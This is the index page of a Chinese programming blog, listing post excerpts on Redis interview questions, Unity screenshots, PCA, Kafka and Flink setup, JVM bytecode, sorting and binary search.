<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44140546094de0d8f8102ea0ab8fac9c/" rel="bookmark">
			Redis常见面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis有哪些数据结构？ 字符串String、字典Hash、列表List、集合Set、有序集合SortedSet。如果你是Redis中高级用户，还需要加上下面几种数据结构HyperLogLog、Geo、Pub/Sub。如果你说还玩过Redis Module，像BloomFilter，RedisSearch，Redis-ML，面试官得眼睛就开始发亮了。
使用过Redis分布式锁么，它是什么回事？ 先拿setnx来争抢锁，抢到之后，再用expire给锁加一个过期时间防止锁忘记了释放。这时候对方会告诉你说你回答得不错，然后接着问如果在setnx之后执行expire之前进程意外crash或者要重启维护了，那会怎么样？这时候你要给予惊讶的反馈：唉，是喔，这个锁就永远得不到释放了。紧接着你需要抓一抓自己得脑袋，故作思考片刻，好像接下来的结果是你主动思考出来的，然后回答：我记得set指令有非常复杂的参数，这个应该是可以同时把setnx和expire合成一条指令来用的！对方这时会显露笑容，心里开始默念：摁，这小子还不错。
假如Redis里面有1亿个key，其中有10w个key是以某个固定的已知的前缀开头的，如果将它们全部找出来？ 使用keys指令可以扫出指定模式的key列表。
如果这个redis正在给线上的业务提供服务，那使用keys指令会有什么问题？
这个时候你要回答redis关键的一个特性：redis的单线程的。keys指令会导致线程阻塞一段时间，线上服务会停顿，直到指令执行完毕，服务才能恢复。这个时候可以使用scan指令，scan指令可以无阻塞的提取出指定模式的key列表，但是会有一定的重复概率，在客户端做一次去重就可以了，但是整体所花费的时间会比直接用keys指令长。
使用过Redis做异步队列么，你是怎么用的？ 一般使用list结构作为队列，rpush生产消息，lpop消费消息。当lpop没有消息的时候，要适当sleep一会再重试。如果对方追问可不可以不用sleep呢？list还有个指令叫blpop，在没有消息的时候，它会阻塞住直到消息到来。如果对方追问能不能生产一次消费多次呢？使用pub/sub主题订阅者模式，可以实现1:N的消息队列。
如果对方追问pub/sub有什么缺点？
在消费者下线的情况下，生产的消息会丢失，得使用专业的消息队列如rabbitmq等。
如果对方追问redis如何实现延时队列？ 我估计现在你很想把面试官一棒打死如果你手上有一根棒球棍的话，怎么问的这么详细。但是你很克制，然后神态自若的回答道：使用sortedset，拿时间戳作为score，消息内容作为key调用zadd来生产消息，消费者用zrangebyscore指令获取N秒之前的数据轮询进行处理。到这里，面试官暗地里已经对你竖起了大拇指。但是他不知道的是此刻你却竖起了中指，在椅子背后。
如果有大量的key需要设置同一时间过期，一般需要注意什么？ 如果大量的key过期时间设置的过于集中，到过期的那个时间点，redis可能会出现短暂的卡顿现象。一般需要在时间上加一个随机值，使得过期时间分散一些。
Redis如何做持久化的？ bgsave做镜像全量持久化，aof做增量持久化。因为bgsave会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要aof来配合使用。在redis实例重启时，优先使用aof来恢复内存的状态，如果没有aof日志，就会使用rdb文件来恢复。
如果再问aof文件过大恢复时间过长怎么办？ 你告诉面试官，Redis会定期做aof重写，压缩aof文件日志大小。如果面试官不够满意，再拿出杀手锏答案，Redis4.0之后有了混合持久化的功能，将bgsave的全量和aof的增量做了融合处理，这样既保证了恢复的效率又兼顾了数据的安全性。这个功能甚至很多面试官都不知道，他们肯定会对你刮目相看。
如果对方追问那如果突然机器掉电会怎样？ 取决于aof日志sync属性的配置，如果不要求性能，在每条写指令时都sync一下磁盘，就不会丢失数据。但是在高性能的要求下每次都sync是不现实的，一般都使用定时sync，比如1s1次，这个时候最多就会丢失1s的数据。
Pipeline有什么好处，为什么要用pipeline？ 可以将多次IO往返的时间缩减为一次，前提是pipeline执行的指令之间没有因果相关性。使用redis-benchmark进行压测的时候可以发现影响redis的QPS峰值的一个重要因素是pipeline批次指令的数目。
Redis的同步机制了解么？ Redis可以使用主从同步，从从同步。第一次同步时，主节点做一次bgsave，并同时将后续修改操作记录到内存buffer，待完成后将rdb文件全量同步到复制节点，复制节点接受完成后将rdb镜像加载到内存。加载完成后，再通知主节点将期间修改的操作记录同步到复制节点进行重放就完成了同步过程。
是否使用过Redis集群，集群的原理是什么？ Redis Sentinal着眼于高可用，在master宕机时会自动将slave提升为master，继续提供服务。Redis Cluster着眼于扩展性，在单个redis内存不足时，使用Cluster进行分片存储。
原文链接：https://www.cnblogs.com/zhangjianbing/p/9889604.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fdfcc4d59d6c83db168fa50914d8a2c/" rel="bookmark">
			Unity使用Rect类进行截屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于截屏有很多种截取全屏的方法，但是想要截取Game视图中的部分区域，可以使用Rect和ReadPixels进行截取。如下图所示，是需要截取的部分。
浅蓝色是Game视图，即全屏幕尺寸，红色区域是基于Canvas左上角对齐，红色区域右边距离屏幕边界610px,下面距离屏幕边界70px,蓝色区域是红色区域的子级图片，上下左右居中对齐，现在要截取蓝色区域的图片导出。
1.可以先创建一个Rect得到要截取的矩形区域，Rect rect = new Rect(float x, float y, float width, float height);
该方法先在屏幕上获取一个坐标点，以及长和宽来确定一个举行区域。
2.然后：Texture2D screenShot= new Texture2D(int width, int height, TextureFormat format, bool mipmap)
即创建纹理，纹理的宽和高，格式，是否为位图。
3. screenShot.ReadPixels(Rext rect, int destX, int destY, bool recalculateMipmaps)
4.screenShot.Apply();
5.System.IO.File.WriteAllBytes("D://xxxxx/xxx/" + picName, bytes);
6.System.IO.File.WriteAllBytes(Live3DApplication.Instance.config.poserEditorImgPath(false) + picName, bytes);
尝试用GetComponent&lt;RectTransform&gt;().anchoredPosition来得到Rect, 关键在于要计算得出Rect的第一个坐标点的位置，但是不管怎么计算，多次尝试都无法得到需要的截图，经过尝试，确定Rect的原点是在屏幕的左下角，但是RectTransform的锚点坐标却是负值，得出结论：不能使用锚点坐标来计算Rect坐标，只能使用深蓝色区域的宽和高，以及屏幕的宽和高来计算Rect 的位置坐标，如下：
//background为深蓝色区域UI的GameObject, x, y为Rect的坐标值 float x = (Screen.width - 610) / 2 - background.GetComponent&lt;RectTransform&gt;().rect.width / 2; float y = (Screen.height - 70) / 2 + 70 - background.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fdfcc4d59d6c83db168fa50914d8a2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e9f32ba35221c617e1f6aeb44a4c051/" rel="bookmark">
			求一元二次方程的根，用三个函数分别求当b^2-4*a*c大于0，等于0，小于0时的根，并输出结果，从主函数输入a,b,c的值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt;
#include&lt;math.h&gt;
void Dy(float x, float y,float z)
{
float s,p;
s=p = -y / (2 * x);
printf(“该方程的根为：%.4f,%.4f\n”, s,p);
}
void Da(float x, float y,float z,float disc)
{
float m, n;
m = (-y + sqrt(disc)) / (2 * x);
n = (-y - sqrt(disc)) / (2 * x);
printf(“该方程的根为：%.4fand%.4f\n”, m,n);
}
void Xy(float x, float y, float z, float disc)
{
float t, r;
t = -y / (2 * x);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e9f32ba35221c617e1f6aeb44a4c051/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7d4cd9b19bc9f7328e2bb4263e14e98/" rel="bookmark">
			主成分分析（PCA）原理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.相关背景 在许多领域的研究与应用中，通常需要对含有多个变量的数据进行观测，收集大量数据后进行分析寻找规律。多变量大数据集无疑会为研究和应用提供丰富的信息，但是也在一定程度上增加了数据采集的工作量。更重要的是在很多情形下，许多变量之间可能存在相关性，从而增加了问题分析的复杂性。如果分别对每个指标进行分析，分析往往是孤立的，不能完全利用数据中的信息，因此盲目减少指标会损失很多有用的信息，从而产生错误的结论。
因此需要找到一种合理的方法，在减少需要分析的指标同时，尽量减少原指标包含信息的损失，以达到对所收集数据进行全面分析的目的。由于各变量之间存在一定的相关关系，因此可以考虑将关系紧密的变量变成尽可能少的新变量，使这些新变量是两两不相关的，那么就可以用较少的综合指标分别代表存在于各个变量中的各类信息。主成分分析与因子分析就属于这类降维算法。
2. 数据降维 降维就是一种对高维度特征数据预处理方法。降维是将高维度的数据保留下最重要的一些特征，去除噪声和不重要的特征，从而实现提升数据处理速度的目的。在实际的生产和应用中，降维在一定的信息损失范围内，可以为我们节省大量的时间和成本。降维也成为应用非常广泛的数据预处理方法。
降维具有如下一些优点：
1) 使得数据集更易使用。
2) 降低算法的计算开销。
3) 去除噪声。
4) 使得结果容易理解。
降维的算法有很多，比如奇异值分解(SVD)、主成分分析(PCA)、因子分析(FA)、独立成分分析(ICA)。
3. PCA原理详解 通过正交变换将一组可能存在相关性的变量转换为一组线性不相关的变量，转换后的这组变量叫主成分。
Principal Component Analysis(PCA)是最常用的线性降维方法，它的目标是通过某种线性投影，将高维的数据映射到低维的空间中表示，并期望在所投影的维度上数据的方差最大，以此使用较少的数据维度，同时保留住较多的原数据点的特性。
通俗的理解，如果把所有的点都映射到一起，那么几乎所有的信息（如点和点之间的距离关系）都丢失了，而如果映射后方差尽可能的大，那么数据点则会 分散开来，以此来保留更多的信息。可以证明，PCA是丢失原始数据信息最少的一种线性降维方式。（实际上就是最接近原始数据，但是PCA并不试图去探索数 据内在结构）
3.1 PCA的概念
PCA(Principal Component Analysis)，即主成分分析方法，是一种使用最广泛的数据降维算法。PCA的主要思想是将n维特征映射到k维上，这k维是全新的正交特征也被称为主成分，是在原有n维特征的基础上重新构造出来的k维特征。PCA的工作就是从原始的空间中顺序地找一组相互正交的坐标轴，新的坐标轴的选择与数据本身是密切相关的。其中，第一个新坐标轴选择是原始数据中方差最大的方向，第二个新坐标轴选取是与第一个坐标轴正交的平面中使得方差最大的，第三个轴是与第1,2个轴正交的平面中方差最大的。依次类推，可以得到n个这样的坐标轴。通过这种方式获得的新的坐标轴，我们发现，大部分方差都包含在前面k个坐标轴中，后面的坐标轴所含的方差几乎为0。于是，我们可以忽略余下的坐标轴，只保留前面k个含有绝大部分方差的坐标轴。事实上，这相当于只保留包含绝大部分方差的维度特征，而忽略包含方差几乎为0的特征维度，实现对数据特征的降维处理。
思考：我们如何得到这些包含最大差异性的主成分方向呢？
答案：事实上，通过计算数据矩阵的协方差矩阵，然后得到协方差矩阵的特征值特征向量，选择特征值最大(即方差最大)的k个特征所对应的特征向量组成的矩阵。这样就可以将数据矩阵转换到新的空间当中，实现数据特征的降维。
（1）协方差矩阵是一个实对称阵
（2）协方差矩阵的对角线上的元素是每个维度的方差
（3）协方差矩阵计算的是一个样本中不同维度之间的协方差，而不是两个或多个样本之间的协方差
由于得到协方差矩阵的特征值特征向量有两种方法：特征值分解协方差矩阵、奇异值分解协方差矩阵，所以PCA算法有两种实现方法：基于特征值分解协方差矩阵实现PCA算法、基于SVD分解协方差矩阵实现PCA算法。（没太看懂，跟着推了一下公式把我推晕了，我看不懂但是我会用啊，哈哈哈哈）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a1bdc30ea98dfb4b1953e059afbb5ef/" rel="bookmark">
			c语言 计算两数的和，多组测试数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：输入两个整数a和b，计算a+b的和
输入：
两个整数A和B 范围不超过2^10输出： 输出：
求A+B 样例输入
1 1 10 20 样例输出
2 30 分析：
这道题的难点在于要求多组测试数据，用while循环来解决。
正确代码：
#include&lt;stdio.h&gt; int main() { int a = 0; int b = 0; while(~scanf("%d%d",&amp;a,&amp;b)) { printf("%d\n",a+b); } return 0; } 知识点：
~scanf ("%d%d",&amp;a,&amp;b)相当于 scanf("%d%d",&amp;a,&amp;b) != EOF,用来判断文件是否结束了。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbfa07425ffc4c8316144130c2ac3045/" rel="bookmark">
			Kafka单机模式部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启动zookeeper 安装步骤见：zookeeper部署
下载kafka安装包 http://kafka.apache.org
解压包上传至linux服务器opt目录下
安装 cd /opt # 解压tgz包 tar xvf kafka_2.12-2.3.0.tgz // 修改server.properties配置文件 vi /opt/kafka_2.12-2.3.0/config/server.properties # broker的全局唯一编号，不能重复 broker.id=0 # 监听 listeners=PLAINTEXT://:9092 # 日志目录 log.dirs=/home/hadoop/kafka-logs # 配置zookeeper的连接（如果不是本机，需要该为ip或主机名） zookeeper.connect=localhost:2181 // 启动kafka /opt/kafka_2.12-2.3.0/bin/kafka-server-start.sh /opt/kafka_2.12-2.3.0/config/server.properties # 使用jps名称查看是否正常运行 $ jps 9173 Kafka 9462 Jps 8589 QuorumPeerMain Kafka的简单使用 创建topic bin目录下： kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test 参数说明： –zookeeper：指定kafka连接zk的连接url，该值和server.properties文件中的配置项{zookeeper.connect}一样 –replication-factor：指定副本数量 –partitions：指定分区数量 –topic：主题名称 查看topic bin目录下： kafka-topics.sh --list --zookeeper localhost:2181 创建一个生产者 bin目录下： .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbfa07425ffc4c8316144130c2ac3045/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5049acc124368a611831c340f69bf0b2/" rel="bookmark">
			七夕祭（算法竞赛进阶指南 P29，中位数 &#43; 思维 ？）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.题目链接： 七夕祭 二.题目大意： 中文题不解释.
三.分析： { 根据移动规则易得：
上下交换两个点，该列中所需摊位个数不变.
左右交换两个点，该行中所需摊位个数不变.
那不妨先上下移动实现 row ，再左右移动 实现 col.
立即推：若 t 为 n 的倍数，则可实现 row；若 t 为 m 的倍数，则可实现 col.
下面只讨论如何实现 row，col 类比即可.
{ 根据题目描述可得，这是要进行 行的部分交换，使得每行的元素个数均相等.
不过这是个环形，为了简化问题，我们先考察线型的问题.
{ 即：有一行元素，每个相邻的元素进行部分交换，最终使得每个元素相同.
这个问题很简单，只需要 "多退少补" 到下一个元素即可.
例如：设每个元素的个数为 a[i]，平均数为 mean.
那么可由贪心解决
若 a[1] &gt; mean，则第一个人将 a[1] - mean 个给第二个人.
若 a[1] &lt; mean，则第一个人从第二个人那里取走 a[1] - mean 个.
即：使第一个人达到目标的最少交换次数为 |a[1] - mean|.
同理，对 [2, n] 进行相同操作.
由于第一步只是[1，2]之间的元素交换，所以 sum[2]（前缀和）不变.
所以第二步所需的交换次数为 |2 * mean - sum[2]|
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5049acc124368a611831c340f69bf0b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbba62f0c25cf2f3488f6ab368ecd071/" rel="bookmark">
			排序算法之插入排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插入排序有两种方法：直接插入排序、希尔排序
1.直接插入排序 （升序） 把待排序的记录按其关键码值的大小逐个插入到一个已经拍好序的有序序列中，直到所有的记录都插入完成为止，得到一个新的有序序列。
当插入第i个元素的时，前面的 i-1个元素都已经排好序了（arr[0],arr[1],arr[2],……arr[i-1],），此时用arr[i]和arr[i-1],arr[i-2]……的排序进行比较，找到第一个小于arr[i]的元素arr[j],将arr[i]插入到arr[j]后面位置，arr[j]和arr[i]之间的元素依次向后移动一个单位。
代码实现：
void InsertSort(int array[], int size){ for (int i = 1; i &lt; size; i++){ int k = array[i]; int j; for (int j = i - 1; j &gt;= 0; --j){ if (array[j] &lt;= k) break; else array[j + 1] = array[j]; } array[j + 1] = k; } } 总结：
元素集合越接近有序，直接插入排序的时间效率越高时间复杂度：O(N^2) 最坏O(N^2) 最好的情况 O(N)空间复杂度：O(1)稳定性： 稳定 可优化的地方：在寻找插入位置arr[j+1]时，可使用二分查找的方法快速计算插入位置。 2.希尔排序（缩小增量排序） 直接插入排序的时间复杂度为O(n^2),但是若待排序序列为“正序”时，且数据量比较小，其时间复杂度可提高至O(n),由此可见若待排序列越接近有序，直接插入排序的效率也就越高。
希尔排序是对直接插入排序的优化。希尔排序基本思想就是：先将整个待排序列分割成若干个自序列分别进行直接插入排序，待整个序列接近基本有序时再对整个序列进行一次直接插入排序。
希尔排序的具体流程：
初始化一段数据：9 1 2 5 7 4 8 6 3 5 分别为N0~N9；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbba62f0c25cf2f3488f6ab368ecd071/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57392595df0ffccbda2099e81feb61fe/" rel="bookmark">
			Flink DataStream API - Sink 结果输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DataStream API - Sink 打印至控制台打印至文本文件打印至csv文件打印至scoket通过连接器打印到Kafka 打印至控制台 // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 获取数据源 DataStream&lt;String&gt; text = env.socketTextStream("IP", port, "\n"); ...省略中间算子处理... // 使用一个并行度将结果打印至控制台 text.print().setParallelism(1); 打印至文本文件 // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 获取数据源 DataStream&lt;String&gt; text = env.socketTextStream("IP", port, "\n"); ...省略中间算子处理... // 使用一个并行度将结果打印至文本文件 text.writeAsText(String path).setParallelism(1); 打印至csv文件 // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 获取数据源 DataStream&lt;String&gt; text = env.socketTextStream("IP", port, "\n"); ...省略中间算子处理... // 使用一个并行度将结果打印至控制台 text.writeAsCsv(String path).setParallelism(1); 打印至scoket // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57392595df0ffccbda2099e81feb61fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05a5e5b94bc66fff951e156f604a92fc/" rel="bookmark">
			JVM是如何执行i = i&#43;&#43; &#43; &#43;&#43;i的，你知道吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JVM是如何执行i = i++ + ++i 最近比较困扰i++以及++i操作在JVM中实现的原理，直到读了下面一篇文章之后就豁然开朗！分享该文章希望对你有帮助！
结果是多少？ public static void main(String[] args) { int i = 0; i = i++ + ++i; System.out.println(i); }//结果输出 2 为什么是2？ 一个.java文件首先要被编译成.class文件jvm才能够运行，而jvm是根据java代码生成的字节码来确认他要如何运行程序的。说的再通俗一点就是，jvm看不懂java代码，他能看懂的是字节码，而编译就是这么一个翻译的过程。
所以为了了解i = i++ + ++i的运行原理，我们首先反汇编这段代码(请先编译java文件，Main.java是我的文件名)：在命令行下输入
javap -c Main.class
可以看到字节码是：
0: iconst_0 1: istore_1 2: iload_1 3: iinc 1, 1 6: iinc 1, 1 9: iload_1 10: iadd 11: istore_1 12: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 15: iload_1 16: invokevirtual #3 // Method java/io/PrintStream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05a5e5b94bc66fff951e156f604a92fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f078c4dd38835c43e705e6f95c56cab/" rel="bookmark">
			Flink DataStream API - Data Source获取数据源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DataStream API - Data Sources 基于文件获取数据源基于Socket获取数据源基于Collection获取数据源基于连接器（connectors）获取数据源自定义Source 基于文件获取数据源 在底层，Flink将文件读取过程分成两个子任务，即目录监视和数据读取。每个子任务都由一个单独的实体实现。监视由单个非并行(parallelism = 1)任务实现，而读取由多个并行运行的任务执行。后者的并行性等于作业并行性。单个监视任务的作用是扫描目录(定期或仅扫描一次，这取决于watchType)，找到要处理的文件，将它们分成几部分，并将这些部分分配给下游的读取器。读取器将读取实际数据。每个拆分只能由一个读取器读取，而一个读取器可以逐个读取多个拆分。
// 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 逐行读取文本文件，即符合规范的文件，并将它们作为字符串返回。 DataStream&lt;String&gt; dataStream = env.readTextFile(filePath) // 按指定的文件输入格式指定读取（一次）文件。 DataStream&lt;String&gt; dataStream = env.readFile(fileInputFormat, path) // 这是前两个方法在内部调用的方法,它根据给定的fileInputFormat读取路径中的文件,根据所提供的watchType // 此源可以定期监视(每隔一段时间ms)给定路径文件中的新数据 DataStream&lt;String&gt; dataStream = envreadFile(fileInputFormat, path, watchType, interval, pathFilter, typeInfo) 基于Socket获取数据源 // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 根据socket获取数据源 DataStream&lt;String&gt; dataStream = env.socketTextStream(hostname, port); 基于Collection获取数据源 // 获取运行环境 StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); // 从Java Java.util.Collection创建数据流。集合中的所有元素必须属于同一类型。 DataStream&lt;String&gt; dataStream = env.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f078c4dd38835c43e705e6f95c56cab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b16ca64db5439fbf7785fbcd910601f/" rel="bookmark">
			【编程题】最小调整有序（Java实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【编程题】最小调整有序（Java实现） 题目来源 程序员面试经典
https://www.nowcoder.com/practice/091c2f1cf441484f81696f08328b06cd?tpId=8&amp;tqId=11059&amp;tPage=4&amp;rp=4&amp;ru=/ta/cracking-the-coding-interview&amp;qru=/ta/cracking-the-coding-interview/question-ranking
题目描述 有一个整数数组，请编写一个函数，找出索引m和n，只要将m和n之间的元素排好序，整个数组就是有序的。注意：n-m应该越小越好，也就是说，找出符合条件的最短序列。
给定一个int数组A和数组的大小n，请返回一个二元组，代表所求序列的起点和终点。(原序列位置从0开始标号,若原序列有序，返回[0,0])。保证A中元素均为正整数。
测试样例：
[1,4,6,5,9,10],6
返回：[2,3]
解答 方法一 排序比较
思路
将数组进行排序，从前往后比较第一个不同的为m，从后往前进行比较，第二个不同的为n
例如，原数组： 【3，1，4，5，6】
排序后数组：【1，3，4，5，6】
从前往后第一个不一样为m=0位置
从后往前第一个不一样为n=1位置
代码
import java.util.*; public class Rearrange { public int[] findSegment(int[] A, int n) { // write code here int[] arr=new int[2]; if(A==null||A.length&lt;=0||n&lt;=0)return arr; int[] B=new int[n]; for(int i=0;i&lt;n;i++){ B[i]=A[i]; } Arrays.sort(A); int i=0; while(A[i]==B[i]){ if(i==n-1)return arr; else i++; } int j=n-1; while(A[j]==B[j]){ if(j==0)return arr; else j--; } arr[0]=i; arr[1]=j; return arr; } } 方法二 直接遍历
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b16ca64db5439fbf7785fbcd910601f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2100b3c54ea52fe643a3fb7ecaf8020/" rel="bookmark">
			mx-framework前端框架使用经验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于UAP的MX.FrameWork框架的使用小技巧总结：https://blog.csdn.net/weixin_41548572/article/details/88534526
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e730c7d75e4d119a8ff0b7a29214bb8d/" rel="bookmark">
			一步步推导由欧拉角到旋转矩阵的计算过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了便于理解，我们先来做一道简单的数学题： 如图，坐标系 O X 1 Y 1 OX_1Y_1 OX1​Y1​经过逆时针旋转 θ \theta θ角变换为坐标系 O X 2 Y 2 OX_2Y_2 OX2​Y2​，P点坐标由 ( x 1 , y 1 ) (x_1,y_1) (x1​,y1​)→ ( x 2 , y 2 ) (x_2,y_2) (x2​,y2​)。
问：怎样用用 x 1 , y 1 , θ x_1,y_1,\theta x1​,y1​,θ表示 x 2 , y 2 x_2,y_2 x2​,y2​ ？
解：
由图可得：
a = y 1 − b = y 1 − x 1 t a n θ (1) a=y_1-b=y_1-x_1tan\theta\tag{1} a=y1​−b=y1​−x1​tanθ(1)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e730c7d75e4d119a8ff0b7a29214bb8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6343be3ef632041ff8fcbb70545450c4/" rel="bookmark">
			玩转二分法（python版）——leetcode二分法题总结【简单易懂】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在正式写总结前，我想说一下我踩过的那些坑，当时脑袋都要晕掉了，于是花了两天时间搞明白了二分法，写了这篇总结。 我踩过的那些坑：之前采用while left &lt;= right，经常遇到死循环。而且代码分支很多，经常考虑不到特殊情况，最后把自己绕晕了到底有多少种特殊情况。两天得此总结。 二分法【三步走】方法 1、先确定边界。一般情况下left=0，right=len(nums)-1是数组的索引值，但是如果可能遇到答案是含有最大索引值+1的情况（参考leetcode35题），那么right=len(nums)。 2、while循环部分：然后确定选择左中位数和右中位数(最重要)。一般情况下，看中位数所在的值是不是通过left和right的移动能完全排除，如果都可以完全排除，那选择左中位数和右中位数都可以（参考leetcode704），如果不能完全排除，看左中位数移动left能不能完全排除（看有中位数移动right能不能完全排除）。而且如果选择左中位数，mid = (left + right)/2 left = mid + 1 right = mid;选择右中位数，mid=(left+right+1)/2 right = mid - 1 left = mid。很多情况下，使用左中位数会出现死循环，此时mid=right，解决的方法就是采用右中位数。 实践经验：一般情况下，【1】先选择左中位数，看nums[mid]是不是在第一个if逻辑中完全排除即可以按照left=mid+1，【2】再用两个数的数组验证一下会不会造成死循环，如果不会，那这样ok的。如果进入死循环，那选择右中位数，同时mid = (left + right + 1) // 2 并且 right = mid - 1 3、返回left值前，先看看值在不在数组里，如果一定在，那就不用判断直接返回left，如果不一定在数组里，那么需要判断一下这个值是不是要找的那个，如果不是返回-1。 基本思想 【参考博客，这位大佬说的很清楚可以结合这篇博文和我这篇一起看https://leetcode-cn.com/problems/two-sum/solution/te-bie-hao-yong-de-er-fen-cha-fa-fa-mo-ban-python-/】 （1）首先把循环可以进行的条件写成 while(left &lt; right)，在退出循环的时候，一定有 left == right 成立，此时返回 left 或者 right 都可以 或许你会问：退出循环的时候还有一个数没有看啊（退出循环之前索引 left 或 索引 right 上的值）？ 没有关系，我们就等到退出循环以后来看，甚至经过分析，有时都不用看，就能确定它是目标数值。更深层次的思想是“夹逼法”或者称为“排除法”。 最重点的要注意：在确定核心逻辑时，应该这样想，看mid是否完全排除，如果是 left = mid+1，照这个思路就可，放心，不会错。（此时可能你看不懂，但是看完全文就懂了） （2）“神奇的”二分查找法模板的基本思想（特别重要） “排除法”即：在每一轮循环中排除一半以上的元素，于是在对数级别的时间复杂度内，就可以把区间“夹逼” 只剩下 1 个数，而这个数是不是我们要找的数，单独做一次判断就可以了。 “夹逼法”或者“排除法”是二分查找算法的基本思想，“二分”是手段，在目标元素不确定的情况下，“二分” 也是“最大熵原理”告诉我们的选择。 接下来，让我先甩出来二分法模板！ 二分法模板： def search(nums, target): if nums is None or len(nums) == 0: return -1 left = 0 right = len(num)-1 #【第一步需要判断的】 while left &lt; right: mid = (left + right) // 2 #【第二步需要判断的】 #mid = (left + right +1) // 2 if nums[mid] &gt; target:#条件，需要逻辑判断，此时要避免死循环 left = mid + 1 else: right = mid return left #【第三步要思考的】看是否要判断这个if nums[left] == target 